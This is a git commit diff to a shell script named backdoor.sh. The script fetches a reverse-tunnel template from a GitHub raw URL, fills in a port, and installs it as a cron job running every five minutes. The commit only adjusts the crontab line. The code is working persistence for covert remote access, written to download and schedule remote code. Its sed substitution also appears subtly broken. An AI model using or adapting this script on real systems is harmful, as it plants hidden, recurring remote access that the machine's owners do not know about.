6924c6595089e3df0275f8a5e08b32511bbcff42
tpanum <thomas@panum.dk>
2016-07-14 14:45:45 +0200

    Addded fix

--- backdoor.sh
+++ backdoor.sh
@@ -6,6 +6,6 @@ else
     curl https://raw.githubusercontent.com/tpanum/sh/master/scripts/backdoor_cron.sh > reverse_tunnel_port_$1.sh
     sed -i 's/{{@PORT}}/$1/g/' reverse_tunnel_port_$1.sh
     FILE=$(readlink -f reverse_tunnel_port_$1.sh)
-    CRON_QUERY="*/5 * * * * $FILE"
-    (crontab -l ; echo "0 * * * * $CRON_QUERY") | sort - | uniq - | crontab -
+    CRON_QUERY="*/5 * * * * /bin/sh $FILE"
+    (crontab -l ; echo "$CRON_QUERY") | sort - | uniq - | crontab -
 fi
